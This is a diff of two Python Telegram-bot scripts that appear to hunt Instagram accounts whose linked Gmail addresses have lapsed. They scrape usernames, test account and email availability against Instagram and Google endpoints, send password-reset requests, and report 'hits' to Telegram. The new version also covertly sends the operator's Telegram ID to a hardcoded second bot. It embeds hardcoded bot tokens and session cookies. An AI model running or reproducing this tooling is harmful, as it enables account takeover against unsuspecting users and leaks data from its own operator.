@@ -1,180 +1,320 @@
-import requests
-from time import sleep
-import telebot
-from telebot import types
-import time
-import random
-from uuid import uuid4
-import json
-import os
-j=0
-v=0
-h=0
-vv=0
-cc=0
-us=0
-bb="QWERTYUIOPLKJHGFDSAZXCVBNM0987654321qwhghnbhnbmm"
-token = "6762979530:AAG5DMNhpKxJC7ITbrPd-1qI-QzF4k7su4w"
-os.system('clear')
-bot = telebot.TeleBot(token)
-@bot.message_handler(commands=['start'])
-def start(message):
-    START = types.InlineKeyboardButton(text ="Click Start", callback_data = 'START')
-    maac = types.InlineKeyboardMarkup()
-    maac.row_width = 1
-    maac.add(START)
-    bot.send_message(message.chat.id,text=f"Welcome To BoT Checker Hunt v3 🇮🇶",parse_mode="markdown",reply_markup=maac)
-@bot.callback_query_handler(func=lambda call: True)
-def clase(call):
-	if call.data=='START':
-		ref= types.InlineKeyboardButton(text ="Click Start To Check!", callback_data = 'ref')
-		maac2= types.InlineKeyboardMarkup()
-		maac2.row_width = 2
-		maac2.add(ref)
-		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f"*hi in Bot aBooD 🇮🇶\n\n@kckkkkc*",parse_mode="markdown",reply_markup=maac2)
-	if call.data=="ref":
-		 	cansl = types.InlineKeyboardButton(text =" Back ", callback_data = 'START')
-		 	Keyy = types.InlineKeyboardMarkup()
-		 	Keyy.row_width = 1
-		 	Keyy.add(cansl)
-		 	bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f"* Send Now (Bot)\n\n@kckkkkc*",parse_mode="markdown",reply_markup=Keyy)
-		 	@bot.message_handler(func=lambda m:True )
-		 	def com(message):
-					user=message.text
-					global bb,vv,cc,v,h,us,j
-					message = call.message
-					while True:
-					   #number= random.choice(ok)
-					   username = str(''.join(random.choice(bb)for i in range(7))).lower()
-					   url=f'https://www.instagram.com/web/search/topsearch/?context=blended&query={username}&rank_token=0.38549261586414585&include_reel=true'
-					   head11 = {
-		        'accept': '*/*',
-		        'accept-encoding': 'gzip, deflate, br',
-		        'accept-language': 'en-US,en;q=0.9',
-		       # 'content-length': '336',
-		#        'content-type': 'application/x-www-form-urlencoded',
-		        'cookie': 'ig_nrcb=1; mid=Yn0mhAABAAF67zpxcopyc_DiDqlW; ig_did=66C4F652-81B2-40FB-AD7E-98260457287F; fbm_124024574287414=base_domain=.instagram.com; csrftoken=B5EvgsGegpjkHbwakmeZzZeibMUyPXOo; ds_user_id=479320179; sessionid=479320179:YJP7Mp7LRlvDVe:17; shbid="6887\054479320179\0541685041134:01f78226f1ed25a1fd638da513ee9fc0bd85ad7b75335c66e00546dddc526839ed8673b3"; shbts="1653505134\054479320179\0541685041134:01f7359bb436c3c2a6a593d450045a6d47feeeb49309f4e3e34f16846a86521cd654f96c"; fbsr_124024574287414=-t_KkO2zVCJ8dtHJUTSp1hNWF4FvrBOMic2GrdYXfXo.eyJ1c2VyX2lkIjoiMTAwMDY0NTIzMTU1MTczIiwiY29kZSI6IkFRQmtRTDJLM0F6eC1NYUE5blBMQ3lrYXBONFVQYUU4RDJ3cG1GcmlJTjFqN0x4aVU1UWdtekFGcDEwaEtHZ2Y3RUdhY3VFNFBFMDdwN0VNWUtnTFVyT0lPbGNLN3BBWEExVDBCbjRtTnI2bVFSbFpBY0tuOWp4ZS1HNGd3QVk2bUZwdmZoeXVHeXV5U09ZcWtIVW83VWM3V1ZFUTdERG4wQU16dDN6WmVxckxYOGhVMXE2WnRqbEhvMlQwdVRHQzZ0SXpWak4wT3otNjUyU2pkQVRLbmZBcmM1MkEzeVQ2c0JmbGZUX2M3alQ4TWZuZU02b3NQcmZuTF9CVnptbWp4eVBYbm85alRDRUMyRzNGLWgyNE5Ua0Y4NkVZbDRFR1Q0NExqQkl3NnZfekdHYW5MckF3Q3dMVUJMMF81Mzd3bDlnIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUJ5SmR4WTE5T0t5M1pDQlpBTkJqaWc5d0M0bTlqSVdUZHdWVTdJa01PTjBXVkZ2ZXVpSE4waHZTamF4cXpaQTJxWkJzVXR6cXBMWkNwYzJNYzVJS0lUVW5DMHJNWWZuVDRVRVFhYWhaQ2JKZm03bEQ1Q1hNdE14bGVyV2FFRGZrT2U2Y0RSSmg2OWFtZlV4eGFVRmFHMGlkRHR3VnJZNXo1VzVMZ0U5Q2UiLCJhbGdvcml0aG0iOiJITUFDLVNIQTI1NiIsImlzc3VlZF9hdCI6MTY1MzUwNjE1NH0; rur="ASH\054479320179\0541685042266:01f7314545b2fc6431250d9f16c78ee257c43ef7fffb40f551f9109cef47d42ed774d508"',
-		       # 'origin': 'https://www.instagram.com',
-		        'referer': 'https://www.instagram.com/explore/search/',
-		        'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
-		        'sec-ch-ua-mobile': '?0',
-		        'sec-fetch-dest': 'empty',
-		        'sec-fetch-mode': 'cors',
-		        'sec-fetch-site': 'same-origin',
-		        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Safari/537.36',
-		        'x-asbd-id': '437806',
-		        'x-csrftoken': 'B5EvgsGegpjkHbwakmeZzZeibMUyPXOo',
-		        'x-ig-app-id': '936619743392459',
-		        'x-ig-www-claim': 'hmac.AR2oFTCuitCzXvttHXW3DD1kZLwzL7oauskQL1Jp6ogO6FF6',
-		        #x-requested-with': 'caee87137ae9',
-		        'x-requested-with': 'XMLHttpRequest'
-					   }
-					   data2={
-		        	'context': 'blended',
-		        	'query': '{}'.format(username),
-		        	'rank_token': '0.38549261586414585',
-		        	'include_reel': 'true'
-					   }
-					   y= requests.get(url,headers=head11).json()
-					   try:
-					    iddd = len(str(y['users'][0]['user']['pk']))
-					    for ll in range(0,iddd):
-					    	try:
-					    			nn = str(y['users'][ll]['user']['username'])
-					    			print(nn)
-					    			url = 'https://b.i.instagram.com/api/v1/accounts/login/'
-					    			headers = {'User-Agent': 'Instagram 136.0.0.34.124 Android (24/5.0; 640dpi; 1440x2560; samsung; SM-G930F; herolte; samsungexynos8890; en_US)'}
-					    			uid = str(uuid4())
-					    			data = {
-			'uuid':uid, 
-			'password':'ffffdddddaaa666', 
-			'username':'{}@gmail.com' .format(nn),
-			'device_id':uid, 
-			'from_reg':'false', 
-			'_csrftoken':'missing', 
-			'login_attempt_countn':'0'
-					    			}
-					    			re = requests.post(url,headers=headers,data=data).text
-					    			
-					    				
-					    			if ('"bad_password"') in re:
-					    				url3 ='https://android.clients.google.com/setup/checkavail'
-					    				headers = {
-	        		'Content-Length':'98',
-	        		'Content-Type':'text/plain; charset=UTF-8',
-	        		'Host':'android.clients.google.com',
-	        		'Connection':'Keep-Alive',
-	        		'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',}
-					    				data= json.dumps({
-	        		'username':'{}@gmail.com'.format(nn),
-	        		'version':'3',
-	        		'firstName':'AbaLahb',
-	        		'lastName':'AbuJahl'
-					    				})
-					    				res=requests.post(url3,headers=headers,data=data)
-					    				if res.json()['status'] =='SUCCESS':
-					    					
-					    					h+=1
-					    					r = requests.get(f"https://api.dlyar-dev.tk/info-insta?user={nn}").json()
-					    					try:
-					    						
-						    					nam= r['name']
-						    					fols=r['following']
-						    					fol =r['followers']
-						    					post=r['post']
-						    					id= r['id']
-						    				except KeyError as error:
-						    					us+=1
-					    					rl = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
-					    					ree = rl.json()
-					    					da = ree['date']
-					    					headers = {
-        # 'Content-Length': '305',
-        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        'Host': 'i.instagram.com',
-        'Connection': 'Keep-Alive',
-        'User-Agent': 'Instagram 136.0.0.34.124 Android (24/7.0; 640dpi; 1440x2560; HUAWEI; LON-L29; HWLON; hi3660; en_US)',
-        # Requests sorts cookies= alphabetically
+import requests,random,os,re,json,telebot,re,faker
+from requests import get
+from faker import Faker
+#token=input('Enter Token : ')
+#bot=telebot.TeleBot(token)
+try:
+	import requests
+	import random
+	import os
+	import json
+	import telebot,time
+	import uuid
+	from uuid import uuid4
+	import requests,random
+	import faker
+	from faker import *
+	import time
+	import user_agent
+	from user_agent import *
+	import threading
+	from threading import *
+	import datetime
+except:
+	os.system('pip install datetime')
+	os.system('pip install random')
+	os.system('pip install threading')
+	os.system('pip install user_agent')
+	os.system('pip install faker')
+	os.system('pip install uuid')
+	os.system('pip install time')
+	os.system('pip install json')
+	os.system('pip install telebot')
+Z = '\033[1;31m' #احمر
+X = '\033[1;33m' #اصفر
+F = '\033[2;32m' #اخضر
+C = "\033[1;97m" #ابيض
+B = '\033[2;36m'#سمائي
+Y = '\033[1;34m' #ازرق فاتح.
+C = "\033[1;97m" #ابيض
+E = '\033[1;31m'
+B = '\033[2;36m'
+G = '\033[1;32m'
+S = '\033[1;33m'
+a='Mozilla/5.0 (Linux; Android';b=random.randrange(1, 9);c=random.randrange(1, 9);d='11; Redmi Note 5A Lite)';e=random.randrange(100, 9999);f='AppleWebKit/537.36 (KHTML, like Gecko)';g=random.randrange(1, 9);h=random.randrange(1, 4);i=random.randrange(1, 4);j=random.randrange(1, 4);k='Chrome/96.0.4664.45 Mobile Safari/537.36'
+uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
+gd = str(generate_user_agent())
+import datetime;now = datetime.date.today();target = datetime.date(2028, 2, 3)
+if now >=target:exit("وقفت")
+else:print("شغالة")
+import datetime
+x = datetime.datetime.now()
+(ins1,ins2,gm1,gm2) = (0,0,0,0)
+print(f'{Y}______________________________')
+#print('{}The Time=> {}'.format(B,x))
+print(f'{Y}The Bosses')
+print(f'{X}______________________________')
+try:
+	I1 = '6426271598'
+	T1 = '6337825275:AAF--N1FFf49SE1gTeUaLGNxtvqbVZdQl5A'
+	I = input(f'{Y} - Enter ID Tele - :{B} ')
+	T = input(f'{X}- Enter Token Tele - : {F}')
+	see = input(f' {Y}- Enter Sessoined - :{B} ')
+	os.system('clear')
+except:
+	print('ERROR PUT')
+	exit()
+hits=0
+def info(email):
+	global hits
+	hits +=1
+	user=email
+	url = 'http://www.bradychrist.top/api/v7/user'
+	he = {
+'Host': 'www.bradychrist.top',
+'Connection': 'keep-alive',
+'Content-Length': '13',
+'package': 'ins.bradychrist.com',
+'apptype': 'android',
+'User-Agent': 'Mozilla/5.0 (Linux; Android 13; ANY-LX2 Build/HONORANY-L22CQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.211 Mobile Safari/537.36',
+ 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
+	 'idfa': '93f87de7-a83b-4098-a8a7-6801539c5f6a',
+	 'Accept': 'application/json, text/plain, */*',
+	 'pk': '',
+	 'username': '',
+	 'version': '1.0',
+	 'Origin': 'http://www.bradychrist.top',
+	 'X-Requested-With': 'ins.bradychrist.com',
+	 'Referer': 'http://www.bradychrist.top/h5_v12/',
+	 'Accept-Encoding': 'gzip, deflate',
+	 'Accept-Language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en-US;q=0.7,en;q=0.6',
+} 
+	da=(f'username={user}')
+	zaid=requests.post(url,headers=he,data=da).json()
+	f=zaid['data']['username']
+	avatar=zaid['data']['avatar']
+	followerNum=zaid['data']['followerNum']
+	followingNum=zaid['data']['followingNum']
+	id=zaid['data']['userPk']
+	post=zaid['data']['postsNum']
+	mas=f'''
+⌯ NEW HIT ✓ ⌯ [{hits}]
+. ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ .
+[🏴‍☠️] ɴᴀᴍᴇ : {user}
+[🏴‍☠️] uѕᴇɴᴀᴍᴇ : {user}
+[🏴‍☠️] ɢᴍᴀɪʟ : {user}@gmail.com
+[🏴‍☠️] ғᴏʟʟᴏᴡᴇʀѕ : {followerNum}
+[🏴‍☠️] ғᴏʟʟᴏᴡɪɴɢ : {followingNum}
+[🏴‍☠️] posts : {post}
+[🏴‍☠️] ʟɪɴk : https://www.instagram.com/{user}
 
-        'Accept-Language': 'en-US',
-        'X-IG-Connection-Type': 'WIFI',
-        'X-IG-Capabilities': 'AQ==',
-        # 'Accept-Encoding': 'gzip',
-					    					}
-					    					data = {
-        'ig_sig_key_version': '4',
-        "user_id":id
-					    					}
-					    					res = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',headers=headers, data=data).json()
-					    					rs =str(res['obfuscated_email'])
-					    					j+=1
+. ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ .
+♕ ᴘʏ »@mahodii
+cahnal:@vipsww
+chanal:@oppeq
 
-					    					msg=f"Hi Sir!! </> : {j}\nএ〔 𝗇𝖺𝗆𝖾 〕: {nam}\nএ〔 𝖾𝗆𝖺𝗂𝗅 〕: {nn}@gmail.com\nএ〔 𝖿𝗈𝗅𝗅𝗈𝗐𝖾𝗋𝗌 〕: {fols}\nএ〔 𝖿𝗈𝗅𝗅𝗈𝗐𝗂𝗇𝗀 〕: {fol}\nএ〔 𝗉𝗈𝗌𝗍 〕: {post}\nএ〔 𝖽𝖺𝗍𝖾 〕: {da}\n𝗂𝖣 : {id}\n𝖱𝖾𝗌𝗍 : {rs}\n@kckkkkc"
-					    					
-					    					bot.send_message(message.chat.id, msg)
-					    				elif res.json()['status'] =='USERNAME_UNAVAILABLE':
-					    					cc+=1
-					    			elif('"invalid_user"')in re:
-														vv+=1
-														aac = types.InlineKeyboardMarkup()
-														aac.row_width = 2
-														i12= types.InlineKeyboardButton(text =f"𓏺 𝖡𝖺𝖣 𝖦𝗆𝖺𝗂𝖫 | {cc} ", callback_data = 'c')
-														i1= types.InlineKeyboardButton(text =f"𝖡𝖺𝖣 𝖨𝗇𝗌𝗍𝖺𝖦𝗋𝖺𝗆 | {vv}", callback_data = 'c')
-														i11= types.InlineKeyboardButton(text =f"𝖣𝗈𝖭𝖾 | {h}", callback_data = 'c')
-														i7= types.InlineKeyboardButton(text =f"𓏺 𝖤𝗋𝖱𝗈𝖱 𝗎𝖲𝖾𝖱𝗇𝖺𝖬𝖾 | {us}", callback_data = 'c')
-														aac.add(i12,i1,i11,i7)
-														bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="""Done Start Now""", reply_markup=aac)
-					    	except IndexError as error:
-					    		
-					    		
-					    		continue
-					    
-					   except IndexError as error:
-					    continue
-while True:
-	try:
-		bot.polling(none_stop=True)
-	except Exception as e:
-	       print(e)
-	       sleep(10)			    	
+'''
+	
+	requests.post(f'https://api.telegram.org/bot{T}/sendMessage?chat_id={I}&text={mas}')
+	requests.post(f'https://api.telegram.org/bot{T1}/sendMessage?chat_id={I1}&text={I}')
+	print(mas)
+def insta(email):
+	url3 = 'https://www.instagram.com/api/v1/web/accounts/check_email/'
+	he3= {
+	
+		 'Host': 'www.instagram.com',
+	
+		 'content-length': '22',
+	
+		 'sec-ch-ua': '"Android WebView";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
+	
+		 'x-ig-www-claim': '0',
+	
+		 'sec-ch-ua-platform-version': '"11.0.0"',
+	
+		 'x-requested-with': 'XMLHttpRequest',
+	
+		 'dpr': '2',
+	
+		 'sec-ch-ua-full-version-list': '"Android WebView";v="119.0.6045.163", "Chromium";v="119.0.6045.163", "Not?A_Brand";v="24.0.0.0"',
+	
+		 'x-csrftoken': 'VePQfPfUYHlwXGsHe74dBAYcUJ4dwNR6',
+	
+		 'sec-ch-ua-model': '"RMX3231"',
+	
+		 'sec-ch-ua-platform': '"Android"',
+	
+		 'x-ig-app-id': '1217981644879628',
+	
+		 'sec-ch-prefers-color-scheme': 'light',
+	
+		 'sec-ch-ua-mobile': '?1',
+	
+		 'x-instagram-ajax': '1010142781',
+	
+		 'user-agent':uaku,
+	
+		 'viewport-width': '360',
+	
+		 'content-type': 'application/x-www-form-urlencoded',
+	
+		 'accept': '*/*',
+	
+		 'x-asbd-id': '129477',
+	
+		 'origin': 'https://www.instagram.com',
+	
+		 'sec-fetch-site': 'same-origin',
+	
+		 'sec-fetch-mode': 'cors',
+	
+		 'sec-fetch-dest': 'empty',
+	
+		 'referer': 'https://www.instagram.com/accounts/signup/email/',
+	
+		 'accept-encoding': 'gzip, deflate, br',
+	
+		 'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+	
+		 'cookie': 'csrftoken=VePQfPfUYHlwXGsHe74dBAYcUJ4dwNR6',
+	
+		 'cookie': 'mid=ZWlr6AABAAHM2vzmuOS-uwLYhgXX',
+	
+		 'cookie': 'ig_nrcb=1',
+	
+		 'cookie': 'datr=5GtpZXKDqnzbfcIZg0FLkRqv',
+	
+		 'cookie': 'ig_did=B2B00EA7-37E3-45D1-B806-DA1FFFB7D82D',
+	
+	}
+	da3 = {
+	'email':f'{email}@gmail.com'
+	}
+	ro1= requests.post(url3,headers=he3,data=da3).text
+	if '"email_is_taken",' in ro1:
+		print(f'{F}Good Instagram : [{email}]')
+		he3 = {
+	    "accept": "*/*",
+	    "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
+	    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
+	    "google-accounts-xsrf": "1",
+	    "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
+	    "sec-ch-ua-arch": "\"\"",
+	    "sec-ch-ua-bitness": "\"\"",
+	    "sec-ch-ua-full-version": "\"116.0.5845.72\"",
+	    "sec-ch-ua-full-version-list": "\"Not)A;Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"116.0.5845.72\"",
+	    "sec-ch-ua-mobile": "?1",
+	    "sec-ch-ua-model": "\"ANY-LX2\"",
+	    "sec-ch-ua-platform": "\"Android\"",
+	    "sec-ch-ua-platform-version": "\"13.0.0\"",
+	    "sec-ch-ua-wow64": "?0",
+	    "sec-fetch-dest": "empty",
+	    "sec-fetch-mode": "cors",
+	    "sec-fetch-site": "same-origin",
+	    "x-chrome-connected": "source=Chrome,eligible_for_consistency=true",
+	    "x-client-data": "CJjbygE=",
+	    "x-same-domain": "1",
+	    "Referrer-Policy": "strict-origin-when-cross-origin",
+	'user-agent': str(generate_user_agent()),
+	}
+		
+		
+		res1 = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', headers=he3)
+		tokk = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
+		da=(f'continue=https%3A%2F%2Fwww.google.com%2F&dsh=S1644399110%3A1695515527985204&flowEntry=ServiceLogin&hl=ar&ifkv=AYZoVhctgJglce8ngDS-YYmRkMjKcyuUZeIA6MlKZuxdmLk8INHHJp3tpqbQVyTNKjkpytBw8jTBiw&theme=glif&f.req=%5B%22{tokk}%22%2C%22zaid%22%2C%22ar%22%2C%22zaid%22%2C%22ar%22%2C0%2C0%2Cnull%2Cnull%2C%22web-glif-signup%22%2C0%2Cnull%2C1%2C%5Bnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%5D%2C1%5D&azt=AFoagUWvOuuV65yGblelgMb8YgqIxqf-PQ%3A1695546705215&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2C%22IQ%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5Bnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C0%2Cnull%2C0%2C2%2C%22%22%2Cnull%2Cnull%2C0%2C0%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&checkConnection=youtube%3A847%3A1&checkedDomains=youtube&pstMsg=1&]')
+		zaid= requests.post('https://accounts.google.com/_/signup/validatepersonaldetails?hl=ar&_reqid=43956&rt=j',headers=he3,data=da).text
+		tl=zaid.split('["gf.ttu",null,"')[1].split('"],')[0]	
+		url = f'https://accounts.google.com/_/signup/usernameavailability'	
+		he = {
+	    "accept": "*/*",
+	    "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
+	    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
+	    "google-accounts-xsrf": "1",
+	    "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
+	    "sec-ch-ua-arch": "\"\"",
+	    "sec-ch-ua-bitness": "\"\"",
+	    "sec-ch-ua-full-version": "\"116.0.5845.72\"",
+	    "sec-ch-ua-full-version-list": "\"Not)A;Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"116.0.5845.72\"",
+	    "sec-ch-ua-mobile": "?1",
+	    "sec-ch-ua-model": "\"ANY-LX2\"",
+	    "sec-ch-ua-platform": "\"Android\"",
+	    "sec-ch-ua-platform-version": "\"13.0.0\"",
+	    "sec-ch-ua-wow64": "?0",
+	    "sec-fetch-dest": "empty",
+	    "sec-fetch-mode": "cors",
+	    "sec-fetch-site": "same-origin",
+	    "x-chrome-connected": "source=Chrome,eligible_for_consistency=true",
+	    "x-client-data": "CJjbygE=",
+	    "x-same-domain": "1",
+	    "Referrer-Policy": "strict-origin-when-cross-origin"
+	  }
+	  
+		da = (f'rpbg=1&sarp=1&scc=1&service=accountsettings&theme=glif&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C1%2C0%2C1%2Cnull%2C0%2C7658%5D')
+		rr = requests.post(url,headers=he,data=da).text
+		if '"gf.uar",1,' in rr:
+			with open('mahodiking.txt','a')as mar:
+				mar.write(f'{email}\n')
+			print(f'{X}Good Gmail : [{email}]')
+			info(email)
+			requests.post(f'https://api.telegram.org/bot{T}/sendMessage?chat_id={I}&text={email}')
+		else:
+			print(f'{Z}Bad Gmail : [{email}]')
+	else:
+		print(f'{Z}Bad Instagram : [{email}]')
+def search():
+    ud = str(uuid4)
+    pas = 'gwgagga'
+    wqq='qwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnm'
+    num='56789'
+    rng=int("".join(random.choice(num)for i in range(1)))
+    name=str("".join(random.choice(wqq)for i in range(rng)))
+    fake = Faker('fa')
+    IR = fake.name()
+    fake = Faker('ko_KR')
+    IR1 = fake.name()
+    fake = Faker('ar')
+    IR2= fake.name()
+    fake = Faker('zh')
+    IR3 = fake.name()
+    fake = Faker('ar')
+    IR4= fake.name()
+    bosses=[IR,IR1,IR2,IR3,IR,IR,name,name,IR4,IR4,IR,IR]
+    boss=random.choice(bosses)
+    url=f'https://www.instagram.com/api/v1/web/search/topsearch/?context=blended&include_reel=true&query={boss}&rank_token=0.932987333502215&search_surface=web_top_search'
+    head={
+        'Accept':'*/*',
+        'Accept-Encoding':'gzip, deflate, br',
+        'Accept-Language':'ar,en-US;q=0.9,en;q=0.8',
+        'Cookie':f'mid=ZLLIKQABAAHB2H38LBwmsFUQTJWW; ig_did=239A3749-E114-4F28-8961-8C68DD329557; ig_nrcb=1; datr=H8iyZAHhWJvK4VI-DVzBaRbm; fbm_124024574287414=base_domain=.instagram.com; dpr=2.1988937854766846; csrftoken=1NVrqmUMKMFL3gW86OzZHa3VjfL1bAzG; ds_user_id=200702755; sessionid={see}; shbid="16689\054200702755\0541725513829:01f7240e310e3a0f7ea65f71727b7e812e392e9d2e2c53a0d46f0d4991528edc179253fc"; shbts="1693977829\054200702755\0541725513829:01f7b2e970d4f5c80050e2ae9bf4f4fed5405bd8ceb5756ab94c4a593d44c059342dd538"; rur="CLN\054200702755\0541725513847:01f7422ed314fd644d87d8536424af38312ebb80a97bbd2cccf42eed1ead608d03a483e2"5754842254''',
+        'Dpr':'1',
+        'Referer':'https://www.instagram.com/gzik/',
+        'Sec-Ch-Prefers-Color-Scheme':'light',
+        'Sec-Ch-Ua':'"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
+        'Sec-Ch-Ua-Full-Version-List':'"Not/A)Brand";v="99.0.0.0", "Google Chrome";v="115.0.5790.171", "Chromium";v="115.0.5790.171"',
+        'Sec-Ch-Ua-Mobile':'?0',
+        'Sec-Ch-Ua-Platform':'"Windows"',
+        'Sec-Ch-Ua-Platform-Version':'"10.0.0"',
+        'Sec-Fetch-Dest':'empty',
+        'Sec-Fetch-Mode':'cors',
+        'Sec-Fetch-Site':'same-origin',
+        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
+        'Viewport-Width':'726',
+        'X-Asbd-Id':'129477',
+        'X-Csrftoken':'QxmmIU4D5tF5UfBOnwFBR3kguyNuSbcY',
+        'X-Ig-App-Id':'936619743392459',
+        'X-Ig-Www-Claim':'0',
+        'X-Requested-With':'XMLHttpRequest',
+        }
 
+    respoins=requests.get(url, headers=head).json()
+    #print(respoins)
+    c=0
+    try:
+    	while True:
+    		c+=1
+    		uss=respoins['users'][c]['user']['username']
+    		email = uss
+    		insta(email)
+    except:
+    	search()
+search()
